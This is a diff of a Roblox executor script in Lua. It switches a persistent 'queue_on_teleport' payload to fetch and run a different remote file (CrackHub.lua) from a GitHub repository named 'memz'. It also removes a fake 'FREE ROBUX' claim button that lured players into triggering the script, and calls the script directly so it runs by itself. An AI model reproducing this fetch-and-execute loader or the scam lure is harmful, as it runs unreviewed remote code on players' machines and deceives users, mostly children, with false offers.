@@ -55,7 +55,7 @@ local TELEPORT_SCRIPT = [[
     ImageLabel.Size = UDim2.new(0.110689439, 0, 0.198863626, 0)
     ImageLabel.Image = "rbxassetid://14195957999"
     local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/P996Lazer69/memz/main/lol.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/P996Lazer69/memz/main/CrackHub.lua'))()
 ]]
 
 local function RUN_SCRIPT()
@@ -1071,48 +1071,5 @@ local function RUN_SCRIPT()
     END_SCRIPT()
 end
 
-local prm = Instance.new("ScreenGui")
-local Frame = Instance.new("Frame")
-local Frame_2 = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local TextButton = Instance.new("TextButton")
-prm.Name = "prm"
-prm.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-prm.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Frame.Parent = prm
-Frame.BackgroundColor3 = Color3.fromRGB(38, 255, 0)
-Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.301898748, 0, 0.392768085, 0)
-Frame.Size = UDim2.new(0.395569623, 0, 0.214463845, 0)
-Frame_2.Parent = Frame
-Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame_2.BorderSizePixel = 0
-Frame_2.Position = UDim2.new(0.283199996, 0, 0, 0)
-Frame_2.Size = UDim2.new(0.4208, 0, 1, 0)
-TextLabel.Parent = Frame_2
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.186311781, 0, 0.20348835, 0)
-TextLabel.Size = UDim2.new(0.623574138, 0, 0.209302321, 0)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "FREE ROBUX"
-TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
-TextLabel.TextWrapped = true
-TextButton.Parent = Frame_2
-TextButton.BackgroundColor3 = Color3.fromRGB(38, 255, 0)
-TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.BorderSizePixel = 0
-TextButton.Position = UDim2.new(0.133079842, 0, 0.558139563, 0)
-TextButton.Size = UDim2.new(0.760456264, 0, 0.290697664, 0)
-TextButton.Font = Enum.Font.SourceSans
-TextButton.Text = "CLAIM"
-TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextButton.TextSize = 14.000
-
-TextButton.MouseButton1Click:Connect(RUN_SCRIPT)
+RUN_SCRIPT()
 queue_on_teleport(TELEPORT_SCRIPT)
